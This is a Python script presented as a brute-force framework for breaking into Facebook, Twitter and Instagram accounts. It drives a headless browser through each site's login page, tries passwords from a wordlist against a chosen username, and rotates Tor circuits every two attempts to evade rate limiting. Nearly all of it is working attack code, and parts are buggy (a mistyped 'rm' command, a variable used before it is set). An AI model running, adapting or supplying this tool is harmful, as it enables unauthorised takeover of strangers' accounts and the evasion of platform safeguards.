 # -*- coding: utf-8 -*-
import smtplib, argparse, paramiko, mechanize, telnetlib, ftplib, os, sys
from time import sleep
from subprocess import call
from xmpp import *
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from stem import Signal
from stem.control import Controller
from stem.connection import connect
from pyvirtualdisplay import Display
from urllib2 import urlopen



reload(sys)

sys.setdefaultencoding('utf8')



W = '\033[0m'   # White

R = '\033[31m'  # Red

G = '\033[32m'  # Green

O = '\033[33m'  # Orange



def main():
    

    parser = argparse.ArgumentParser(description='Bruteforce framework written in Python')  # Parameters

    required = parser.add_argument_group('required arguments')

    required.add_argument('-s', '--service', dest='service')

    required.add_argument('-u', '--username', dest='username')

    required.add_argument('-w', '--wordlist', dest='password')

    parser.add_argument('-d', '--delay', type=int, dest='delay')



    args = parser.parse_args()

    

    service = args.service

    username = args.username

    wordlist = args.password

    delay = args.delay

    

    if os.path.exists(wordlist) == False:

        print(R + "Error : WordList not Found" + W)

        exit(1)



    if delay is None:

        delay = 1



    os.system("clear && /etc/init.d/tor restart && rm -rf tmp/ geckodriver.log")



    Bruter(service, username, wordlist, delay).execute()



class Bruter(object):



    def __init__(self, service, username, wordlist, delay):

        self.service = service

        self.username = username

        self.wordlist = wordlist

        self.delay = delay


    def stopTOR(self):   # Stoping Tor

        driver.close()

        os.system("m -rf tmp/ geckodriver.log")

        tor_process.kill()

        exit(1)



    def Tor_Check(self): # STEM Controller checking

        controller = connect()

        if not controller:

            self.stopTOR()

            exit(1)

        print("- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)



    def setIP(self):    # Changing Public IP 

        with Controller.from_port(port = 9051) as controller:

            controller.authenticate(password = 'tor_password')

            controller.signal(Signal.NEWNYM)



    def execute(self):  # Connection Between def main() 


        if self.usercheck(self.username, self.service) == 1:

            print("[ " + R + "Error" + W + " ]" + " Username Does not Exist\n" + W)

            exit(1)

        else:

            print("[ " + G + "ok" + W + " ]" + " Checking Account Existence\n")

            self.webBruteforce(self.username, self.wordlist, self.service, self.delay)



    def usercheck(self, username, service):

        display = Display(visible=0, size=(800, 600))

        display.start()

        global driver

        driver = webdriver.Firefox()

        try:

            if service == "facebook":


                 fb_name = raw_input(O + "Please Enter The NAME Of The Facebook Account : " + W)

                 driver.get("https://www.facebook.com/public/" + fb_name)

                 assert (("We couldn't find anything for") not in driver.page_source)

                 driver.close()

            elif service == "twitter":

                driver.get("https://www.twitter.com/" + username)

                assert (("Sorry, that page doesn’t exist!") not in driver.page_source)

                driver.close()

            elif service == "instagram":

                driver.get("https://instagram.com/" + username)

                assert (("Sorry, this page isn't available.") not in driver.page_source)

                driver.close()

        except AssertionError:

            return 1





    def webBruteforce(self, username, wordlist, service, delay):

        driver = webdriver.Firefox()

        if service == "facebook":

            driver.get("https://touch.facebook.com/login?soft=auth/")

        elif service == "twitter":

            driver.get("https://mobile.twitter.com/session/new")

            WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')

        elif service == "instagram":

            driver.get("https://www.instagram.com/accounts/login/?force_classic_login")

        self.Tor_Check()

        j=0

        wordlist = open(wordlist, 'r')

        for i in wordlist.readlines():

            password = i.strip("\n")

            try:

                if service == "facebook":

                    elem = driver.find_element_by_name("email")

                elif service == "twitter":

                    elem = driver.find_element_by_name("session[username_or_email]")

                elif service == "instagram":

                    elem = driver.find_element_by_name("username")

                elem.clear()

                elem.send_keys(username)

                

                if service == "facebook":

                    elem = driver.find_element_by_name("pass")

                elif service == "twitter":

                    elem = driver.find_element_by_name("session[password]")

                elif service == "instagram":

                    elem = driver.find_element_by_name("password")

                elem.clear()

                elem.send_keys(password)

                elem.send_keys(Keys.RETURN)

                

                sleep(delay) 



                if service == "facebook":

                    assert (("Log into Facebook | Facebook") in driver.title)

                elif service == "twitter":

                    if driver.current_url == "https://mobile.twitter.com/home":

                        print(G + ("  Username: %s \t| Password found: %s\n",username, password) + W)

                        self.stopTOR()

                elif service == "instagram":

                    assert (("Log in — Instagram") in driver.title)

                print(O + ("  Password: %s \t| Failed \t| IP : %s \n " % (password,my_ip)) + W)

                j+=1

                if j == 2:

                   self.setIP()

                   my_ip = urlopen("http://ip.42.pl/raw").read()

                   j = 0

                sleep(delay)



            except AssertionError: 

                print(G + ("  Username: %s \t| Password found: %s\n" % (username,password)) + W)

                self.stopTOR()

            except Exception as e:

                print(R + ("\nError : %s" % e) + W)

                driver.close()

                self.stopTOR()


if __name__ == '__main__':

    try:

        main()

    except KeyboardInterrupt:

        print(R + "\nError : Keyboard Interrupt" + W)

        self.stopTOR()



#[Errno111] issue fix, systemctl tor restart added